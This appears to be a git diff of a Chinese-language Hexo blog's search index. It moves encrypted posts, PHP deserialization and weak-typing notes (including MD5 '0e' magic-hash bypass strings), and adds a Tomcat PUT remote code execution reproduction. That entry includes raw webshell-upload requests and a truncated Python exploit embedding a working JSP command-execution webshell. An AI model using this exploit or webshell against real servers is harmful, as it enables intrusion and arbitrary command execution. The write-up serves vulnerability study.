d6282f4dfc62dc97231ff9bd75f6e35516c53e1a3350b6f71a6b49c43186e51bf299161562748e02831c26b70476f33830d838781f715c1cf43609d2bc2ce7f8e27ff1c78e3dbce298745771547fb631090f61b5de6a04663d4f19ed200e6e5251343856407d42832307ae1ba380f05bfb8a7c3066b19782b2105ec91cae957eb406070f76b6dc16f7a7222a8aa0239d5de0c532acee1f598465ccd613f6704e65627c949897f6c03638fb558684f08b32b77a227c792e841ccccc1d3404ad74c1c207128c1cf9f040bb14f68b244fe5c27613e8fd5867a9e15825757ee130e7a100ed63cd59753b2b0c7969f94e7229b9c253f1f274d9553111979cc917f66b9722e2b00a021ab4695545bb5df91badea8247f278459242b1e3931a8fe00eb2d37de9d88f3796ee307875c736e08e50476f71b7abb046c638a671294a2e64dc79dbc1bd4de9dee89e12aa42772f232fa5f87a9fee0f97a799cade54eae234ee1760d38b892e111786e2acb99557daeadba8cb572424606f70d6fa7cfbcd8b0727b91a2c69a0d44f97ece6ee12e57031d2136327b78fdbd594070628c27188b4584a88007436b55ca22ea23056f8709215367cfe138bfaf6ae34c310e1da39137dd5725f6b8009309240a212698ca57a9bacca7b740544e313bf0e1b803fb80627e6cd8f8f439960bdbc32de4a692816f4be1638438a4133010801f4c89a4e3cadbda826fcd340f9a88b104107dd2a770756aac57f317df0ca2ce922ca920973505f90e0e55c170c9aaae0ae63476a7c8fee357dc72997f8e6fd75cb54036d8de3d60b5f20aea100d63d8cd663a6faf6d0090d39f85bdac3e13287fbaeb0800260e8516e3e5b8c3268302b1e67ac09ce6dae61c13fc9ef85dbc9d5ec78c5767eecf8395430ef327266c4e240e59bc7ded93c32121f5ce4146cbfb8c5808f0dbf7bb9114cbcac3875705a4dd4b6aa7e627856c1bff27b5cc0f6db326839a6018d69c67bc022f559528f775d15bcba0c7feea5be80c532864e1731e4ee2966aa75bf3f8a3da1310e7583d27f5d63b5f8edcf191de62c9c762cfd7eae667c204aa6c7f16737f8742bd5ff0c20901adb8f435ebdccb4821e28a88842ac4818bd207fb82cc8eccaaed7585405f733ef14601a712ec71ed28d178b5f02361b7c574950ccdfa555a915b06a69f26a0ba4e93409f9c19ee9553f890483c2d4c99a0644f4d903e044a5dce1d1b21d7b74c90f861afc73144ce888552f38fab80dbf563784b632a688afd3b1eff068fa3a21e885e472e6bc6ac9965f5f5a4c6d5a0fac6b79c84f1e746d57e5b74dea194ff193a7b86551189e30a3bd36af05ecc5bc2e3be04ad4cc5d3dc518478c54033011b239df4a2473f60e152a0565c7fdd77855984d2946e9b8e68648aea686be841439d1c0bf8c5d6eb1fded684935febc9acd2707810bb7630fade2278</script>
+  <script id="hbeData" type="hbeData" data-hmacdigest="ba6dfe94f4eefac9f4c1dfd6b938a978a6b3c4472e8c1bb3bc4719cb2c363dc6">0080238256e3bfab0aad7c6c06adfe08978cf5e4291d19911e89ab77562c795911e174036507d9011817cf2cd0bf4820c481a07fc1f4c68e50a9d7cffbbedaefae12ce81e6c9c0784f5689c858659271c63cd66cfb5a98a47ec5debadb1bd9e728e8309d12cdce8e1f78cba620e874c4411dd7bf75f305dc01e27c342c5d2e21b64e59da6970bcf66d3f55cba5b7bdcaaf081f23692ad77a4c1127bf66bf048d6166f1c46b4ec70fb36b8340fa0e5722559de262ab079f945fbdaca867deb295596bf12cbf5bdc6a3fc465877bfcbe004189a64bfa690ad6d286d1beed5c3edcb526531cec3eadc618be453b0bcca787545b949da46237c40f747e666ba266c019eb4e1659ca03bd11b7adde11ff40a3c924cb6100e5eb1bcf97d7ef00387dca4a68b3508cdfd84fe2f20d147c2d0d5587e17655a90884d9d059ce76357cedfd204c63867b21f9c00dcd2fff8b0331a2d4473305f5a09ab631d617014ab8893423ad6186306492e94797f0185cd56d7ff4f986a08d5e36ff284ab537a9d281a5d4475fef3ca4abd75b1e895f258a8aef2b085b0be236e2473a34845554e1fee0a970f5c3a41d467511316368cc37c344d8e6524ff13fb28eac0493ea84f215f09bb3eeb9b0537c7e0f21f6ee1e2159d3be456639fd85a6d603586ebf85498d54527653319b18e3f6bc3ddc47e270560f300bbc53b657a9d4985fa1aa85f5162c47897542480aaa2d5c2f022ebad717e95660038e60503fc1b91f8a79a80df0b583ce0fab7776d011ce62a1dc93b1962090331357fc9ce4242979acfb1e2a9d0fdef1526369e1d055165b61aa9d2370fe81a7da3981a05cc9281398ce3433bdfb85114f1830a06f5c721e77007c80ec1c89ba36e07ad79289dee286978d088195f15f8c3cb0626d6c3ea9bfec8d76fd3a086d58c10cd2630c77e03e49f513c697ead2456d00955ecca2b0ad3f55590fcd33d080b417c1b65159fee978fabc54b6eb178f2a663011423964c4593a8c6bd96f8ed0c8d1e0b9d3b59293cb7df993d1797faf610fb8525fd7b4bdff95d9aac5c0057486d4635d542b663611a18145829d29e3acdaea51a1aa8bf075099a987c77e52f24cd902f050a8a5a7b5bea2f83f86dc283ff96b29962e79d888fad1b8adb6172b67862236fa0bc2526b9a3ce1d8bf98361249de5e50a600436aa7ac82e545c763500359f4f9a8fc4de6e39220c42f8c82ccd0785c55e99d3b4666632e51454663d7bd4e30d63e26a9a6923533774389a7d454d3f4a9c1ee3c8ee32bf12a78855d717eb37e88031bfe4d149740e207a6d450a3e431627b5140591eec37090c714d52e57e9716107ac734211d2acaa81d67bfb5f9d1293f4076f1ec0f366a77f337fc917cef47eabe809afe309b93237948ff60edd0fbe3e253e51d00207d00c90e6f0a08b18e1430344e1ab59678fdbd1ff374d0831b4d1f6b7f9e3275d6c76ae44b8bd3a25983dec374d877b360f7d5fb9fade8d387e8adb3a4fe9e8fe5b8da0b89dd5c48678fac77239220114b8837246be759de0468ca7e37145665b64dd796c0b76f427923153ccedfd68ccb0b42818b7668ae0e9238777133b4bc379325c7c906a6ba8847d9942fc2c0eea60b83dce9c0f59d59374200baefbff5e80c21d725c3018ea64c6254cd5c96eb69520508f71afe681217f42fdee58840d763329f9b925ad56bd8ab400b97247b4de6a026ebd2f6a34f548633d79c2a08e336435c3360d049ddc7abc757140f4f5ee6b9dc6f3c42a31dfe9bae19d66d0be00fe359cdad201a134849503e975438fc6daa4b533cf85c96def146ef37af5e9d7012a6978183719f9f44772fe273232ce78d1b4d59488f851ff1b9657862c80b1e183e68af57e380cf8217622f5e03b3e90b8654ac7eab72fe9844132bdac52ffd29481788702c2591e835b9a63f2ddbd132cc3b641e152a6e67d3b1caca184b232883c77596b04b92cf212eb650d76c4cf923685ee9fde5d62666257cb54a34975a95023047f8b3f4cc15970001d5de419879d0da8cdcfc5132274887abcf61bae1194cc19efa6b8f17cdaf0e1eb860ba4b98d0a67763b56d313260212986447557be595d86a45d47f3c60df9f6cb888401f5a016f697353061a5c7bc29ee534cc628a5d6b40e049bbcedc3a7e12131584129e0cf9a273b0c7892a9dedada03990faffcddbc292ea1db8258c556b79cfbf2c2b2d703bf82796ec1b8be7ed7484dda54938b8afd648f65142b711d1b68a77e787acc1d735d6986efc13ed7a4fcf7836f723b2235225aa1e27918f31e1cc1ecc224d341f77edc4d114376c5a2b41f87d01e54b0b2514578402ba7ed2625472884e2e5816b5c76a572aa81b81c748bcd5c7138f8b50e1ac8b4852907b56181a0d4f38df38a033d11cec44b88b290caefd1c92cb92cae529e04f5c576d7cb1c406a411fd574d8f0ecb443f048ca2c15c85bc60cc750b3db46cb1c1077b6433ef49f101bca7075ca34271acda14ef5b8120d60f5ff2020680c19ecbf86a8eaa2260cf939a3dfc278f337d2a9d0aa0a7d8c1c3a7401a279154a1dfa20411e8570466cc6f5f660add3d8b95581905141574abf892550b477d83e55686bff510d3b5e0fd985e06cfa2329ce6ad8e986db6897a56746b97343fc8d870c6cedf14539e0a7fb0a67de8029efe8bce0b141bd93d33b88f69fa1463664975a6d5654369f2b6e593216c03e3fc5b91996491b153811dcd9cea4d1524e9749ac8174a9abc08aad423809e070b0e1fe2756e2257e2e52d51c5ea79ff35df2944badca982eaf8804ad642c86796c8ff7a9db6d068bf601f965848c6b5a93871b6a65d628cdb7c5def6635093eda53f2b0a4c0fd096097eb6dd535bd2fac75ac2b4aaf9039dfc60853f46c4af8569e9fd3f7e34ea3462922d1a0ef6b5a02765eb569199f43b93ca76ffb9a77cd725d0d2e042215f260f4c46a3c4450fa8cacc1d8d5436c7a7274eedaa8c6fdb8aac61668df47073355abf4c52fb8f1a4b4e2f0c0622f8ed50e49af592db131b38875178b7f48e369057d80361ef7f8b37915bd89a8506adc78476abc66908bf434ddc2ee6222d5866442c76f1e26c362715ff3d88bba3eee3434cce5c63fac28681cdae2125635f1dae60b54ce7cbeaef6753fcf5284bda04cd3312c57f454cb0213ec09cbf3f3d71ef012077df60266593fe6b3efc74eaf3f429676b23754e6417d045b313c035237f93bcc0044aca49d1fef1643de5b388b2f7adabf5eea51ac260bbb5af9882304cadaf33d42799614458000b05d26b12e28722b15a3dbdc232713dcf5f3b978f825a43a47246f475457d0c5a037efb2d045988f15f06f90ec528f03aa0bd1111efe3cda116454fc53c72a822a6f32eef93506b0580bc88f4f418b97c23d8e6f07b179c420d8bc582b8dbe46e9e446177e1d1ddcb430fa6f41e92a5a7d42ac7d</script>
 </div>
 <script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
-        <category>漏洞复现</category>
+        <category>hexo</category>
       </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
   </entry>
   <entry>
     <title>php伪协议</title>
@@ -1553,22 +1569,6 @@
       <tags>
         <tag>php</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/posts/16107.html</url>
-    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="" />
-    <label for="hbePass">输入密码，查看文章！</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="ba6dfe94f4eefac9f4c1dfd6b938a978a6b3c4472e8c1bb3bc4719cb2c363dc6">0080238256e3bfab0aad7c6c06adfe08978cf5e4291d19911e89ab77562c795911e174036507d9011817cf2cd0bf4820c481a07fc1f4c68e50a9d7cffbbedaefae12ce81e6c9c0784f5689c858659271c63cd66cfb5a98a47ec5debadb1bd9e728e8309d12cdce8e1f78cba620e874c4411dd7bf75f305dc01e27c342c5d2e21b64e59da6970bcf66d3f55cba5b7bdcaaf081f23692ad77a4c1127bf66bf048d6166f1c46b4ec70fb36b8340fa0e5722559de262ab079f945fbdaca867deb295596bf12cbf5bdc6a3fc465877bfcbe004189a64bfa690ad6d286d1beed5c3edcb526531cec3eadc618be453b0bcca787545b949da46237c40f747e666ba266c019eb4e1659ca03bd11b7adde11ff40a3c924cb6100e5eb1bcf97d7ef00387dca4a68b3508cdfd84fe2f20d147c2d0d5587e17655a90884d9d059ce76357cedfd204c63867b21f9c00dcd2fff8b0331a2d4473305f5a09ab631d617014ab8893423ad6186306492e94797f0185cd56d7ff4f986a08d5e36ff284ab537a9d281a5d4475fef3ca4abd75b1e895f258a8aef2b085b0be236e2473a34845554e1fee0a970f5c3a41d467511316368cc37c344d8e6524ff13fb28eac0493ea84f215f09bb3eeb9b0537c7e0f21f6ee1e2159d3be456639fd85a6d603586ebf85498d54527653319b18e3f6bc3ddc47e270560f300bbc53b657a9d4985fa1aa85f5162c47897542480aaa2d5c2f022ebad717e95660038e60503fc1b91f8a79a80df0b583ce0fab7776d011ce62a1dc93b1962090331357fc9ce4242979acfb1e2a9d0fdef1526369e1d055165b61aa9d2370fe81a7da3981a05cc9281398ce3433bdfb85114f1830a06f5c721e77007c80ec1c89ba36e07ad79289dee286978d088195f15f8c3cb0626d6c3ea9bfec8d76fd3a086d58c10cd2630c77e03e49f513c697ead2456d00955ecca2b0ad3f55590fcd33d080b417c1b65159fee978fabc54b6eb178f2a663011423964c4593a8c6bd96f8ed0c8d1e0b9d3b59293cb7df993d1797faf610fb8525fd7b4bdff95d9aac5c0057486d4635d542b663611a18145829d29e3acdaea51a1aa8bf075099a987c77e52f24cd902f050a8a5a7b5bea2f83f86dc283ff96b29962e79d888fad1b8adb6172b67862236fa0bc2526b9a3ce1d8bf98361249de5e50a600436aa7ac82e545c763500359f4f9a8fc4de6e39220c42f8c82ccd0785c55e99d3b4666632e51454663d7bd4e30d63e26a9a6923533774389a7d454d3f4a9c1ee3c8ee32bf12a78855d717eb37e88031bfe4d149740e207a6d450a3e431627b5140591eec37090c714d52e57e9716107ac734211d2acaa81d67bfb5f9d1293f4076f1ec0f366a77f337fc917cef47eabe809afe309b93237948ff60edd0fbe3e253e51d00207d00c90e6f0a08b18e1430344e1ab59678fdbd1ff374d0831b4d1f6b7f9e3275d6c76ae44b8bd3a25983dec374d877b360f7d5fb9fade8d387e8adb3a4fe9e8fe5b8da0b89dd5c48678fac77239220114b8837246be759de0468ca7e37145665b64dd796c0b76f427923153ccedfd68ccb0b42818b7668ae0e9238777133b4bc379325c7c906a6ba8847d9942fc2c0eea60b83dce9c0f59d59374200baefbff5e80c21d725c3018ea64c6254cd5c96eb69520508f71afe681217f42fdee58840d763329f9b925ad56bd8ab400b97247b4de6a026ebd2f6a34f548633d79c2a08e336435c3360d049ddc7abc757140f4f5ee6b9dc6f3c42a31dfe9bae19d66d0be00fe359cdad201a134849503e975438fc6daa4b533cf85c96def146ef37af5e9d7012a6978183719f9f44772fe273232ce78d1b4d59488f851ff1b9657862c80b1e183e68af57e380cf8217622f5e03b3e90b8654ac7eab72fe9844132bdac52ffd29481788702c2591e835b9a63f2ddbd132cc3b641e152a6e67d3b1caca184b232883c77596b04b92cf212eb650d76c4cf923685ee9fde5d62666257cb54a34975a95023047f8b3f4cc15970001d5de419879d0da8cdcfc5132274887abcf61bae1194cc19efa6b8f17cdaf0e1eb860ba4b98d0a67763b56d313260212986447557be595d86a45d47f3c60df9f6cb888401f5a016f697353061a5c7bc29ee534cc628a5d6b40e049bbcedc3a7e12131584129e0cf9a273b0c7892a9dedada03990faffcddbc292ea1db8258c556b79cfbf2c2b2d703bf82796ec1b8be7ed7484dda54938b8afd648f65142b711d1b68a77e787acc1d735d6986efc13ed7a4fcf7836f723b2235225aa1e27918f31e1cc1ecc224d341f77edc4d114376c5a2b41f87d01e54b0b2514578402ba7ed2625472884e2e5816b5c76a572aa81b81c748bcd5c7138f8b50e1ac8b4852907b56181a0d4f38df38a033d11cec44b88b290caefd1c92cb92cae529e04f5c576d7cb1c406a411fd574d8f0ecb443f048ca2c15c85bc60cc750b3db46cb1c1077b6433ef49f101bca7075ca34271acda14ef5b8120d60f5ff2020680c19ecbf86a8eaa2260cf939a3dfc278f337d2a9d0aa0a7d8c1c3a7401a279154a1dfa20411e8570466cc6f5f660add3d8b95581905141574abf892550b477d83e55686bff510d3b5e0fd985e06cfa2329ce6ad8e986db6897a56746b97343fc8d870c6cedf14539e0a7fb0a67de8029efe8bce0b141bd93d33b88f69fa1463664975a6d5654369f2b6e593216c03e3fc5b91996491b153811dcd9cea4d1524e9749ac8174a9abc08aad423809e070b0e1fe2756e2257e2e52d51c5ea79ff35df2944badca982eaf8804ad642c86796c8ff7a9db6d068bf601f965848c6b5a93871b6a65d628cdb7c5def6635093eda53f2b0a4c0fd096097eb6dd535bd2fac75ac2b4aaf9039dfc60853f46c4af8569e9fd3f7e34ea3462922d1a0ef6b5a02765eb569199f43b93ca76ffb9a77cd725d0d2e042215f260f4c46a3c4450fa8cacc1d8d5436c7a7274eedaa8c6fdb8aac61668df47073355abf4c52fb8f1a4b4e2f0c0622f8ed50e49af592db131b38875178b7f48e369057d80361ef7f8b37915bd89a8506adc78476abc66908bf434ddc2ee6222d5866442c76f1e26c362715ff3d88bba3eee3434cce5c63fac28681cdae2125635f1dae60b54ce7cbeaef6753fcf5284bda04cd3312c57f454cb0213ec09cbf3f3d71ef012077df60266593fe6b3efc74eaf3f429676b23754e6417d045b313c035237f93bcc0044aca49d1fef1643de5b388b2f7adabf5eea51ac260bbb5af9882304cadaf33d42799614458000b05d26b12e28722b15a3dbdc232713dcf5f3b978f825a43a47246f475457d0c5a037efb2d045988f15f06f90ec528f03aa0bd1111efe3cda116454fc53c72a822a6f32eef93506b0580bc88f4f418b97c23d8e6f07b179c420d8bc582b8dbe46e9e446177e1d1ddcb430fa6f41e92a5a7d42ac7d</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
   </entry>
   <entry>
     <title>php序列化与反序列化</title>
@@ -1645,6 +1645,32 @@
 <p>访问：<a href="http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}" target="_blank" rel="noopener">http://127.0.0.1/test5.php?per_serialized=O:4:%22read%22:1:{s:8:%22filename%22;s:5:%222.txt%22;}</a></p>
 <p><img src="http://pp64r48ul.bkt.clouddn.com/5.png" alt="在这里插入图片描述"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上面的学习，我们知道，要想找到一个php漏洞，需要先找到可控的反序列化函数，通过这些反序列化函数，我们去调用一些类，这些类中可能会包含一些魔法函数，在这些魔法函数中可能会有一些我们可控的危险操作，从而触发了php反序列化漏洞。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php弱类型</title>
+    <url>/posts/21181.html</url>
+    <content><![CDATA[<p>弱类型</p>
+<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
+<a id="more"></a>
+<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
+<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
+<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
+<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
+<p>QNKCDZO<br>0e830400451993494058024219903391</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s155964671a<br>0e342768416822451524974117254469</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s214587387a<br>0e848240448830537924465865611904</p>
+<p>s878926199a<br>0e545993274517709034328855841020</p>
+<p>s1091221200a<br>0e940624217856561557816327384675</p>
+<p>s1885207154a<br>0e509367213418206700842008763514</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -1775,32 +1801,6 @@
 ]]></content>
       <tags>
         <tag>Powershell</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php弱类型</title>
-    <url>/posts/21181.html</url>
-    <content><![CDATA[<p>弱类型</p>
-<p>比较：<br>=== 强等于 ：先判断两种字符串的类型，再比较<br>==  弱等于 ：先将字符串类型转换成相同，再比较</p>
-<a id="more"></a>
-<p>如果一个数值和字符串进行比较的时候，会将字符串转换成数值<br>Abc == 0<br>1abc == 1<br>Abc1 == 0<br>0e123 == 0e456 //0e被识别为科学计数法</p>
-<p>如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内<br>该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</p>
-<p>a = 1 + “10.5”  //a = 11.5<br>b = 1 + “-1.1e3” //a = -1099<br>c = 1 + “ab123”   //c = 1<br>d = 1+”2ab”    //d = 3</p>
-<p>MD5绕过<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0</p>
-<p>QNKCDZO<br>0e830400451993494058024219903391</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s155964671a<br>0e342768416822451524974117254469</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s1091221200a<br>0e940624217856561557816327384675</p>
-<p>s1885207154a<br>0e509367213418206700842008763514</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -2013,6 +2013,51 @@ tablename -C &quot;password&quot; --dump</code></p>
       </tags>
   </entry>
   <entry>
+    <title>tomcat复现之远程代码执行漏洞</title>
+    <url>/posts/21635.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（默认关闭），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
+<h3 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 Tomcat 安装目录下的配置文件web.xml中，如果有如下代码，则表示Tomcat已开启  PUT 方法</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure>
+<p>确保readonly参数为true（默认值），即不允许DELETE和PUT操作</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line">&lt;!--                       commands like PUT and DELETE are               --&gt;</span><br><span class="line">&lt;!--                       rejected?  [true]                              --&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上传webshell</p>
+<h3 id="Burpsuite抓包"><a href="#Burpsuite抓包" class="headerlink" title="Burpsuite抓包"></a>Burpsuite抓包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br></pre></td></tr></table></figure>
+
+<p>将上面的 GET 方法改为 PUT ，后面写要创建的webshell名，下面传入webshell的内容</p>
+<p>有下面几种方法：</p>
+<p><strong>/xxx.jsp/</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp&#x2F;  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/21635/1.png" alt="xxx.jsp/"></p>
+<p>这种方法是服务器会把最后的 <code>/</code> 去掉 </p>
+<p><strong>/xxx.jsp%20</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp%20  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
+<p>其中 %20 为url编码，实际是指 (空格)</p>
+<p><img src="/posts/21635/2.png" alt="xxx.jsp%20"></p>
+<p><strong>/xxx.jsp::$DATA</strong>(没有实现)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp::$DATA  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/21635/3.png" alt="::$DATA"></p>
+<p>使用这种方法也可以上传成功，但是却不能被解析，上传的文件名为 123.jsp::$DATA</p>
+<p><strong>执行结果：</strong></p>
+<p><img src="/posts/21635/4.png" alt="命令执行"></p>
+<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p>脚本(基于python2)：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! -*- coding:utf-8 -*- </span><br><span class="line"></span><br><span class="line">import httplib</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">body &#x3D; &#39;&#39;&#39;&lt;%@ page language&#x3D;&quot;java&quot; import&#x3D;&quot;java.util.*,java.io.*&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line &#x3D; new StringBuilder();try &#123;Process pro &#x3D; Runtime.getRuntime().exec(c);BufferedReader buf &#x3D; new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp &#x3D; null;while ((temp &#x3D; buf.readLine()) !&#x3D; null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;&#x2F;pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">    conn &#x3D; httplib.HTTPConnection(sys.argv[1])</span><br><span class="line"></span><br><span class="line">    conn.request(method&#x3D;&#39;OPTIONS&#39;, url&#x3D;&#39;&#x2F;ffffzz&#39;)</span><br><span class="line"></span><br><span class="line">    headers &#x3D; dict(conn.getresponse().getheaders())</span><br><span class="line"></span><br><span class="line">    if &#39;allow&#39; in headers and headers[&#39;allow&#39;].find(&#39;PUT&#39;) &gt; 0 :</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        conn &#x3D; httplib.HTTPConnection(sys.argv[1])</span><br><span class="line"></span><br><span class="line">        url &#x3D; &quot;&#x2F;&quot; + str(int(time.time()))+&#39;.jsp&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">        #url &#x3D; &quot;&#x2F;&quot; + str(int(time.time()))+&#39;.jsp::$DATA&#39;</span><br><span class="line"></span><br><span class="line">        conn.request( method&#x3D;&#39;PUT&#39;, url&#x3D; url, 